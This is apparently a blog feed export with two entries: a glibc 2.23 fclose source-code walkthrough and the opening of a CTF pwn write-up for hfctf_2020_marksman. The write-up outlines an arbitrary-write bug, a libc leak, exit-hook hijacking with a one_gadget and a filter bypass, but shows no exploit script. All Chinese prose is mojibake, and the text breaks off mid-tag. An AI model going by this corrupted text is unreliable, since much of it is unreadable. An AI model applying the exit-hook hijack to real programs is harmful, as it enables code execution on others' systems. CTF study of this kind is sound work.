        <content type="html"><![CDATA[<p>ä¹‹å‰åˆ†æçš„ä¸‰ä¸ªå‡½æ•°æ–‡ç« é“¾æ¥:</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16567446.html">IOå­¦ä¹ â€“æºç è°ƒè¯•fopenå‡½æ•°</a></p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">IOå­¦ä¹ â€“æºç åˆ†æfreadå‡½æ•°</a></p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16578093.html">IOå­¦ä¹ â€“æºç åˆ†æfwriteå‡½æ•°</a></p><p>è¿™ç¯‡æ˜¯IOå‡½æ•°æºç åˆ†æå››éƒ¨æ›²ä¸­çš„æœ€åä¸€ä¸ªfcloseå‡½æ•°(å¹¶ä¸æ˜¯ä»¥åä¸åˆ†æäº†ï¼Œè¯´å®è¯æˆ‘æ„Ÿè§‰åˆ†ææºç å»çœ‹çœ‹æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨çš„å‡½æ•°åˆ°åº•æ˜¯æ€ä¹ˆå®ç°çš„ï¼Œè¿™ä¸ªè¿‡ç¨‹å¾ˆæœ‰æ„æ€ï¼Œå› æ­¤ä»¥åæœ‰æœºä¼šçš„è¯ä¼šå†è°ƒè¯•ä¸€äº›å…¶ä»–å‡½æ•°ï¼ŒèŠ±äº†å››å¤©åˆ†æäº†è¿™å››ä¸ªå‡½æ•°ï¼Œä»æœ€å¼€å§‹åˆ†æfopenå‡½æ•°æºç çš„æ—¶å€™æ‡µæ‡µé€¼é€¼(é‚£ç¯‡æ–‡ç« æˆ‘åŸºæœ¬æ˜¯çº¯é…åˆç€åŠ¨æ€è°ƒè¯•æ‰ææ‡‚çš„æ•´ä½“é€»è¾‘)ï¼Œåˆ°åˆ†æfreadå‡½æ•°æ—¶å¯¹reserve areaä»¥åŠè¾“å…¥å’Œè¾“å‡ºç¼“å†²åŒºæœ‰äº†è®¤è¯†ï¼Œå†åˆ°åŸºæœ¬æ˜¯å¯¹ç€æºç åˆ†æçš„fwriteå‡½æ•°(ä¹Ÿæ˜¯é…åˆç€åŠ¨æ€è°ƒè¯•ï¼Œä¸è¿‡æ­¤æ—¶å°±æ˜¯é™æ€åˆ†ææºç ä¸ºä¸»äº†)ï¼Œæœ€ååˆ°åˆ†æfcloseå‡½æ•°æºç æ—¶æ„Ÿè§‰çš„å¼‚å¸¸é¡ºåˆ©å’Œè‡ªç„¶ã€‚çœŸçš„æ˜¯åˆ†ææ¯ä¸ªå‡½æ•°æ—¶éƒ½æœ‰ä¸åŒçš„æ„Ÿå—ã€‚</p><p>emmmï¼Œæ„Ÿæ…¨æœ‰äº›å¤šäº†ï¼Œä¸‹é¢è¿›å…¥æ­£æ–‡ã€‚</p><h2 id="æ•´ä½“æµç¨‹ï¼š"><a href="#æ•´ä½“æµç¨‹ï¼š" class="headerlink" title="æ•´ä½“æµç¨‹ï¼š"></a>æ•´ä½“æµç¨‹ï¼š</h2><p>ä¸‹é¢æ˜¯fcloseå‡½æ•°çš„æ•´ä½“æµç¨‹ï¼Œå…¶ä»–å¸ˆå‚…å¦‚æœåˆ†æçš„æ—¶å€™ï¼Œå¯ä»¥å‚è€ƒä¸‹å›¾ã€‚</p><img src="https://s2.loli.net/2022/08/12/QDBqLfxORoUMbH8.png" alt="image-20220812201040809" style="zoom:50%;" /><h2 id="æºä»£ç "><a href="#æºä»£ç " class="headerlink" title="æºä»£ç :"></a>æºä»£ç :</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> new[<span class="number">30</span>]=<span class="string">&quot;nice-day&quot;</span>;</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;wt+&quot;</span>);</span><br><span class="line">    fwrite(new,<span class="number">1</span>,<span class="number">10</span>,fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æœ¬æ–‡çš„æºä»£ç ä»¥åŠè°ƒè¯•çš„ç¨‹åºæ‰€ä¾èµ–çš„libcéƒ½ä¸º2.23ç‰ˆæœ¬çš„</strong></p><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ:"></a>æºç åˆ†æ:</h2><p>å…ˆçœ‹ç¬¬ä¸€éƒ¨åˆ†ï¼Œç»è¿‡ä¸€äº›å¯»å¸¸æ£€æŸ¥åï¼Œå»è°ƒç”¨äº†_IO_un_link å‡½æ•°ã€‚åœ¨fopenå‡½æ•°ä¸­æ–°åˆ›å»ºäº†_IO_FILEç»“æ„ä½“ï¼Œå°†å…¶é“¾å…¥äº†_IO_list_allé“¾è¡¨ï¼Œè€Œè¿™ä¸ª_IO_un_link å‡½æ•°åˆ™æ˜¯å°†fopenå‡½æ•°ä¸­åˆ›å»ºçš„_IO_FILEç»“æ„ä½“è„±é“¾ï¼ˆä»£ç å¦‚ä¸‹ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">Â·Â·Â·Â·Â·Â·</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è„±é“¾éƒ¨åˆ†"><a href="#è„±é“¾éƒ¨åˆ†" class="headerlink" title="è„±é“¾éƒ¨åˆ†"></a>è„±é“¾éƒ¨åˆ†</h3><p>ä¸‹é¢æ˜¯_IO_un_linkå‡½æ•°çš„æºç ï¼Œæ•´ä½“ä¹Ÿå¾ˆå¥½åˆ†æã€‚å°±æ˜¯å…ˆå»åˆ¤æ–­æˆ‘ä»¬è¦è„±é“¾çš„è¿™ä¸ª_IO_FILEç»“æ„ä½“æ˜¯å¦ä¸ºé“¾è¡¨çš„å¤´æŒ‡é’ˆã€‚å¦‚æœæ˜¯çš„è¯æ‰§è¡Œ<code>_IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain</code>æ¥è„±é“¾ï¼ˆä»£ç å¦‚ä¸‹ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **<span class="title">f</span>;</span></span><br><span class="line">......</span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">  ++_IO_list_all_stamp;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœè¦è„±é“¾çš„ç»“æ„ä½“ä¸æ˜¯é“¾è¡¨å¤´æŒ‡é’ˆçš„è¯ï¼Œå°±å»éå†æ•´ä¸ªé“¾è¡¨ï¼Œå»æ‰¾åˆ°éœ€è¦è„±é“¾çš„é‚£ä¸ªç»“æ„ä½“ï¼Œç„¶åå†è„±é“¾(ä»£ç å¦‚ä¸‹)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (_IO_FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="åˆ·æ–°è¾“å‡ºç¼“å†²åŒº"><a href="#åˆ·æ–°è¾“å‡ºç¼“å†²åŒº" class="headerlink" title="åˆ·æ–°è¾“å‡ºç¼“å†²åŒº"></a>åˆ·æ–°è¾“å‡ºç¼“å†²åŒº</h3><p>è„±é“¾ä¹‹åï¼Œè°ƒç”¨äº†_IO_file_close_itå‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_acquire_lock (fp);</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure><p>_IO_new_file_close_itå‡½æ•°ä¸­æ˜¾ç¤ºåˆ¤æ–­äº†ä¸€ä¸‹æ–‡ä»¶æ˜¯å¦æœ‰å†™çš„æƒé™ï¼Œå¦‚æœæœ‰çš„è¯å°±è°ƒç”¨_IO_do_flushå‡½æ•°æ¥åˆ·æ–°è¾“å‡ºç¼“å†²åŒºã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">Â·Â·Â·Â·Â·Â·Â·</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_do_flushæ˜¯å®å®šä¹‰ï¼Œè°ƒç”¨äº†_IO_do_writeå‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">       (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span></span><br></pre></td></tr></table></figure><p>_IO_do_writeå‡½æ•°å¯¹è¾“å‡ºç¼“å†²åŒºçš„å‰©ä½™éƒ¨åˆ†ï¼ˆä¹Ÿå°±æ˜¯å®å®šä¹‰ä¸­çš„(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_baseï¼‰è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœè¾“å‡ºç¼“å†²åŒºä¸º0çš„è¯å°±ç›´æ¥è¿”å›ï¼Œå¦‚æœè¾“å‡ºç¼“å†²åŒºä¸­æœ‰æ•°æ®çš„è¯å°±è°ƒç”¨new_do_writeå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>new_do_writeå‡½æ•°ä¸»è¦åšäº†ä¸¤ä»¶äº‹ï¼Œç¬¬ä¸€æ‰§è¡Œäº†ç³»ç»Ÿè°ƒç”¨writeå°†è¾“å‡ºç¼“å†²åŒºä¸­çš„æ•°æ®éƒ½è¯»åˆ°äº†æ–‡ä»¶ä¸­ã€‚ç¬¬äºŒå°±æ˜¯é‡ç½®äº†_IO_write_ptræŒ‡é’ˆ(è¿™ä¸¤ä¸ªæ“ä½œå°±æ„å‘³ç€åˆ·æ–°äº†è¾“å‡ºç¼“å†²åŒº)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç³»ç»Ÿè°ƒç”¨close"><a href="#ç³»ç»Ÿè°ƒç”¨close" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨close"></a>ç³»ç»Ÿè°ƒç”¨close</h3><p>è€Œåéšç€new_do_writeå‡½æ•°çš„è¿”å›ï¼Œç¨‹åºå†æ¬¡è¿”å›åˆ°_IO_new_file_close_itä¸­ï¼Œæ­¤æ—¶è°ƒç”¨äº†vtableä¸­çš„_IO_file_closeå‡½æ•°(è¿™ä¸ªå‡½æ•°å°±ä¸å†è¯´äº†ï¼Œå°±æ˜¯ç³»ç»Ÿè°ƒç”¨äº†ä¸€ä¸‹close)ï¼Œç„¶åè‡³æ­¤çš„è¯ä¸»è¦å°±å‰©ç”³è¯·çš„reserve areaåŒºåŸŸä»¥åŠç”³è¯·å‡ºæ¥å­˜æ”¾_IO_FILEç»“æ„ä½“çš„å†…å­˜è¿˜æ²¡æœ‰é‡Šæ”¾ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">      ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="å°†reserve-areaé‡Šæ”¾æ‰"><a href="#å°†reserve-areaé‡Šæ”¾æ‰" class="headerlink" title="å°†reserve areaé‡Šæ”¾æ‰"></a>å°†reserve areaé‡Šæ”¾æ‰</h3><p>æœ€å_IO_new_file_close_itå‡½æ•°è¿˜å‰©ä¸‹é¢è¿™éƒ¨åˆ†ä»£ç ï¼Œå…ˆåˆ é™¤reserve areaç„¶åå°†readå’Œwriteç›¸å…³æŒ‡é’ˆå…¨éƒ¨ç½®ç©ºï¼Œæœ€åè°ƒç”¨_IO_un_linkç¡®ä¿fopenå‡½æ•°ç”³è¯·çš„_IO_FILEç»“æ„ä½“å·²ç»ä»_IO_list_allé“¾è¡¨ä¸­è„±é“¾ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);<span class="comment">//åˆ é™¤reserve area</span></span><br><span class="line">_IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//è¿™ä¸ªå®æ˜¯å°†readç›¸å…³æŒ‡é’ˆå…¨éƒ¨ç½®ç©º</span></span><br><span class="line">_IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//è¿™ä¸ªå®æ˜¯å°†writeç›¸å…³æŒ‡é’ˆå…¨éƒ¨ç½®ç©º</span></span><br><span class="line"></span><br><span class="line">_IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> close_status ? close_status : write_status;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª_IO_setbå‡½æ•°ä»£ç å¦‚ä¸‹ï¼Œå‘ç°æ˜¯å…ˆå°†reserve areaè¿™ç‰‡å†…å­˜ç»™é‡Šæ”¾æ‰ï¼Œç„¶åæ¸…ç©º_IO_buf_baseå’Œ_IO_buf_endä¸¤ä¸ªæŒ‡é’ˆï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€å°†reserve areaåˆ é™¤æ‰äº†ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å°†ç»“æ„ä½“fpçš„å†…å­˜é‡Šæ”¾æ‰"><a href="#å°†ç»“æ„ä½“fpçš„å†…å­˜é‡Šæ”¾æ‰" class="headerlink" title="å°†ç»“æ„ä½“fpçš„å†…å­˜é‡Šæ”¾æ‰"></a>å°†ç»“æ„ä½“fpçš„å†…å­˜é‡Šæ”¾æ‰</h3><p>æœ€åè¿”å›åˆ°_IO_new_fcloseå‡½æ•°ï¼Œå…ˆæ˜¯è°ƒç”¨äº†vtableä¸­çš„_IO_default_finishå‡½æ•°(è¿™ä¸ªå‡½æ•°ä¸­åšçš„æ“ä½œï¼Œä¹‹å‰å·²ç»åšè¿‡äº†ï¼Œå…¶å®å°±ç›¸å½“äºå•¥éƒ½æ²¡å¹²)ï¼Œç„¶åæœ€åå°†ç»“æ„ä½“fpé‡Šæ”¾æ‰ã€‚è‡³æ­¤fcloseå‡½æ•°ç»“æŸã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> _IO_release_lock (fp);</span><br><span class="line"> _IO_FINISH (fp);</span><br><span class="line">Â·Â·Â·Â·Â·Â·</span><br><span class="line"> <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">   &#123;</span><br><span class="line">     fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">     <span class="built_in">free</span>(fp);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> status;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“fcloseå‡½æ•°è°ƒç”¨æµç¨‹ï¼š"><a href="#æ€»ç»“fcloseå‡½æ•°è°ƒç”¨æµç¨‹ï¼š" class="headerlink" title="æ€»ç»“fcloseå‡½æ•°è°ƒç”¨æµç¨‹ï¼š"></a>æ€»ç»“fcloseå‡½æ•°è°ƒç”¨æµç¨‹ï¼š</h2><p>å…ˆå°†_IO_FILEç»“æ„ä½“è„±é“¾ï¼Œç„¶åå»çœ‹è¾“å‡ºç¼“å†²åŒºä¸­æ˜¯å¦è¿˜æœ‰å†…å®¹ï¼Œå¦‚æœæœ‰çš„è¯å°±ç³»ç»Ÿè°ƒç”¨writeå°†è¾“å‡ºç¼“å†²åŒºä¸­çš„å†…å®¹å†™å…¥æ–‡ä»¶ç„¶ååˆ·æ–°è¾“å‡ºç¼“å†²åŒºã€‚æ¥ç€ç³»ç»Ÿè°ƒç”¨closeå…³é—­æ–‡ä»¶ï¼Œæœ€åå°†ç”³è¯·çš„reserve areaå’Œè£…æœ‰_IO_FILEç»“æ„ä½“çš„å †å—ç»™é‡Šæ”¾æ‰ã€‚</p><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fclose">FILEç»“æ„ä½“åŠæ¼æ´åˆ©ç”¨æ–¹æ³• | Hacked By Fish_o0O (fish-o0o.github.io)</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis">IO FILEä¹‹fcloseè¯¦è§£ Â« å¹³å‡¡è·¯ä¸Š (ray-cp.github.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> æºç è°ƒè¯•&amp;&amp;åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æºç è°ƒè¯•&amp;&amp;åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hfctf_2020_marksman</title>
      <link href="/posts/8cbdee5a.html"/>
      <url>/posts/8cbdee5a.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>é€šè¿‡è¿™é“é¢˜çš„å­¦ä¹ ä¸æ”¶è·æœ‰ï¼š</p><p>1ã€atolå‡½æ•°æ”¾å…¥çš„æ•°æ®åº”è¯¥æ˜¯æ‰“åŒ…ä¹‹å‰çš„ï¼Œè€Œéæ˜¯æ‰“åŒ…ä¹‹åçš„æ•°æ®</p><p>2ã€exitå‡½æ•°æ‰§è¡Œæµç¨‹ï¼Œ<strong>exitå‡½æ•°çš„è°ƒç”¨æµç¨‹exitå‡½æ•°â€”&gt;run_exit_handlerså‡½æ•°â€”&gt;_dl_finiå‡½æ•°â€”&gt; rtld_lock_unlock_recursiveæŒ‡é’ˆ</strong> å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå°†æœ€åçš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å®¹ä¿®æ”¹ä¸ºone_gadgetï¼Œé‚£ä¹ˆå³å¯è·å–shellã€‚è¿™ä¸ªåŠ«æŒexit_hookçš„å¯å–ä¹‹å¤„åœ¨äºï¼Œç¨‹åºæ­£å¸¸ç»“æŸçš„è¯ï¼Œæœ€åéƒ½ä¼šè°ƒç”¨è¿™ä¸ªexitå‡½æ•°</p><p>3ã€å­¦ä¼šäº†é‡æ–°ç»‘å®šç¨‹åºæ‰€å¯¹åº”çš„libcåŠ¨æ€åº“ï¼ˆpatch libcå’Œldï¼‰</p><p>4ã€ç”¨è¿™ä¸ªæ–¹æ³•å¯ä»¥åœ¨å¼€äº†PIEçš„ç¨‹åºä¸­ä¸‹æ–­ç‚¹ã€‚gdb.attach(p, â€˜b * $rebase(0xd63)\ncâ€™)</p><p>5ã€one_gadgetåŠ ä¸Šå‚æ•°-l2å¯ä»¥æœç´¢æ›´å¤šçš„one_gadgetã€‚</p><p>6ã€å³ä½¿ç›¸åŒçš„libcåº“ï¼Œåœ¨å°ç‰ˆæœ¬ä¸åŒçš„æƒ…å†µä¸‹ï¼ŒæŸäº›å†…å®¹çš„åç§»ä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220323150533922-178897691.png"></p><h2 id="é¢˜ç›®åˆ†æï¼š"><a href="#é¢˜ç›®åˆ†æï¼š" class="headerlink" title="é¢˜ç›®åˆ†æï¼š"></a>é¢˜ç›®åˆ†æï¼š</h2><p><img src="/../img/2706180-20220323150546195-1370770969.png"></p><p>ä»£ç å¾ˆå°‘ï¼Œæ¼æ´ä¹Ÿæ¯”è¾ƒæ˜æ˜¾ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶v6çš„å€¼ï¼Œä»¥åŠv7[j]ã€‚å¹¶ä¸”åœ¨printfå‡½æ•°ä¸­ï¼Œ<strong>ç¨‹åºè‡ªå·±æ‰“å°äº†Putsçš„çœŸå®åœ°å€ï¼Œå°±ç›¸å½“äºæˆ‘ä»¬å·²ç»æ‹¿åˆ°äº†libcåŸºåœ°å€</strong>ã€‚</p><p>ä¹Ÿå°±æ˜¯ä»»æ„åœ°å€ä»»æ„å†™ã€‚è¿™é‡Œè·Ÿè¸ªä¸€ä¸‹æ±‡ç¼–ä»£ç ï¼Œæ˜¯æ€ä¹ˆå®ç°ä¸Šè¿°çš„ä»»æ„åœ°å€ä»»æ„å†™çš„ã€‚</p><p><img src="/../img/2706180-20220323150556091-1654120866.png"></p><p><img src="/../img/2706180-20220323150609387-735205154.png"></p><p>æ ¹æ®ä¸Šé¢ä¸¤å¹…å›¾ç‰‡ï¼Œå¯ä»¥å‘ç°ï¼Œ<strong>æœ€åçš„å…·ä½“å®ç°æ˜¯mov [rax],dlè¿™éƒ¨åˆ†å®ç°çš„ã€‚è€Œraxæœ€åæº¯æºå‘ç°æ˜¯sub_B78å‡½æ•°çš„è¿”å›å€¼ã€‚</strong></p><p>å¯ä»¥çœ‹è§è¿™ä¸ªsub_B78çš„è¿”å›å€¼å°±æ˜¯atolå‡½æ•°çš„è¿”å›å€¼ï¼ˆè¿™ä¸ªå‡½æ•°æ˜¯æœ‰å‘çš„ï¼Œä¸‹é¢ä¼šè¯´åˆ°ï¼‰</p><p><img src="/../img/2706180-20220323150619184-1813218470.png"></p><p>dlå°±æ˜¯edxçš„æœ€ä½å­—èŠ‚ã€‚<strong>æ³¨æ„ï¼Œmov [rax],dl []ä¼šå»raxé‡Œé¢å¯»å€ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¿®æ”¹çš„å†…å®¹åº”è¯¥è¢«raxæ‰€æŒ‡å‘ã€‚ç®€å•æ¥è¯´å°±æ˜¯raxå¿…é¡»æ˜¯ä¸ªæŒ‡é’ˆï¼Œè€Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬è¦ä¿®æ”¹çš„å†…å®¹ï¼ˆè€Œä¸èƒ½æŠŠraxå¯„å­˜å™¨é‡Œé¢ç›´æ¥æ”¾æˆæˆ‘ä»¬è¦ä¿®æ”¹çš„å†…å®¹ï¼‰</strong></p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œsub_bc2è¿™ä¸ªå‡½æ•°å­˜åœ¨çš„ç›®çš„å°±æ˜¯å»é™åˆ¶æˆ‘ä»¬çš„one_gadget</p><p><img src="/../img/2706180-20220323150630708-1754089244.png"></p><p><img src="/../img/2706180-20220323150641484-1764129240.png"></p><p>å¦‚æ­¤ï¼Œæˆ‘ä»¬ç°åœ¨æœ‰ä¸¤ç§æ–¹æ³•ï¼Œ<strong>è¦ä¹ˆä½¿ç”¨one_gadgetå‚æ•°l2ï¼Œå»æ‰¾å¯»æ›´å¤šçš„one_gadgetï¼ˆåªä¸è¿‡ä½¿ç”¨æ¡ä»¶å¯èƒ½æ›´è‹›åˆ»ï¼‰ï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯å°†one_gadgetåœ°å€å‡5ï¼Œä»¥æ­¤æ¥ç»•è¿‡æ£€æŸ¥</strong></p><p><img src="/../img/2706180-20220323150651359-2138009206.png"></p><p><img 